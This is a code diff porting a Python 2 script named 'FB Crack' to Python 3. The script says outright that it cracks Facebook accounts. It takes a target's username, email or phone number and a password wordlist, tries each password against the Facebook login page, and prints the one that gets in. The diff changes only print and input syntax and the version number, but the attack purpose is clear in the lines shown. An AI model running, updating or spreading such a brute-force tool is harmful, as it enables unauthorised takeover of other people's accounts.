@@ -8,17 +8,17 @@ import logging
 
 os.system("clear")
 os.system("toilet -f mono12 -F crop FB Crack")
-print 
-print 'Author : Rahat Khan Tusar(RKT)'
-print
-print 'Github : https://github.com/r3k4t'
-print
-print 'Information : This program can crack facebook account and recovery facebook password.Do not use vpn.If you use vpn and it is not work.'
-print
-print 'Version : 4.0'
-print
-email = str(raw_input("Facebook Username (or) Email (or) Phone Number : "))
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
+print()
+print('Author : Rahat Khan Tusar(RKT)')
+print()
+print('Github : https://github.com/r3k4t')
+print()
+print( 'Information : This program can crack facebook account and recovery facebook password.Do not use vpn.If you use vpn and it is not work.')
+print()
+print( 'Version : 4.1')
+print()
+email = input(" Enter Facebook Username (or) Email (or) Phone Number : ")
+passwordlist = input("Enter the wordlist name and path : ")
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
@@ -54,7 +54,7 @@ def brute(password):
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
 			print("\n\n[#] Password Find = {}".format(password))
-			raw_input("ANY KEY to Exit....")
+			input(" PRESS ANY KEY to Exit....")
 			sys.exit(0)
 
 			
@@ -75,10 +75,10 @@ def welcome():
 """
 	total = open(passwordlist,"r")
 	total = total.readlines()
-	print wel 
-	print " [*] Account to crack : {}".format(email)
-	print " [*] Loaded :" , len(total), "passwords"
-	print " [*] Cracking, please wait ...\n\n"
+	print(wel)
+	print( " [*] Account to crack : {}".format(email))
+	print(" [*] Loaded :" , len(total), "passwords")
+	print( " [*] Cracking, please wait ...\n\n")
 
 	
 if __name__ == '__main__':
